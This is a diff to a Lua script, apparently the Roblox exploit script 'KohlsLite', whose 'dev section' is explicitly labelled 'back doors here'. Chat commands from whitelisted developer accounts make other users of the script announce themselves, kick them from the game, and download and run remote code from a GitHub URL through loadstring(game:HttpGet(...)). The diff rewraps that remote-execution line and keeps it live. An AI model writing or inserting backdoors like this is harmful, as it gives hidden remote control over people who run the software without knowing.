@@ -9298,9 +9298,9 @@ function PLRSTART(v)
                         end
                     end
 
-                    -- // dev section \\ --
+                    -- // dev section (back doors here) \\ --
 
-                    if string.sub(msg:lower(), 0, 4) == "-klc" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
+                    if string.sub(msg:lower(), 0, 4) == "-klc" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then -- klc means KohlsLite Check
                         if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
                             Speak("I use KohlsLite!")
                         end
@@ -9318,7 +9318,7 @@ function PLRSTART(v)
                         end
                     end
 
-                    if string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
+                    if string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then -- klk means KohlsLite Kick
                         if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
                             pcall(function()
                                     game.Players.LocalPlayer:Kick("A KohlsLite dev kicked you from the game!")
@@ -9373,7 +9373,9 @@ function PLRSTART(v)
                     end
 
                     if string.sub(msg:lower(), 0, 4) == "-prs" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-                        loadstring(game:HttpGet("https://raw.githubusercontent.com/ThisSadQWE31/beamd/main/procod"))()
+	                if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
+                        	loadstring(game:HttpGet("https://raw.githubusercontent.com/ThisSadQWE31/beamd/main/procod"))()
+			end
                     end
 
                     if string.sub(msg:lower(), 0, 5) == "-load" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
@@ -9443,19 +9445,19 @@ function PLRSTART(v)
                     Chat("h " .. v.Name .. ": " .. message)
 			
                 elseif string.sub(command, 1, 4) == "logs" then
-                    Chat("pm " .. v.Name .. " I can't make you see logs because it's client sided. Sorry!")
+                    Chat("pm " .. v.Name .. " I can't make you see logs because it's client-sided. Sorry!")
 			
                 elseif string.sub(command, 1, 4) == "cmds" then
-                    Chat("pm " .. v.Name .. " I can't make you see commands because it's client sided. Sorry!")
+                    Chat("pm " .. v.Name .. " I can't make you see commands because it's client-sided. Sorry!")
 			
                 elseif string.sub(command, 1, 8) == "commands" then
-                    Chat("pm " .. v.Name .. " I can't make you see commands because it's client sided. Sorry!")
+                    Chat("pm " .. v.Name .. " I can't make you see commands because it's client-sided. Sorry!")
 			
-                elseif string.sub(command, 1, 9) == "musiclist" then
-                    Chat("pm " .. v.Name .. " I can't make you see the music list because it's client sided. Sorry!")
+                elseif string.sub(command, 1, 9) == "musiclist" then -- broken anyways xd
+                    Chat("pm " .. v.Name .. " I can't make you see the music list because it's client-sided. Sorry!")
 			
                 elseif string.sub(command, 1, 11) == "packagelist" then
-                    Chat("pm " .. v.Name .. " I can't make you see the package list because it's client sided. Sorry!")
+                    Chat("pm " .. v.Name .. " I can't make you see the package list because it's client-sided. Sorry!")
 			
                 else
                     Chat(command)
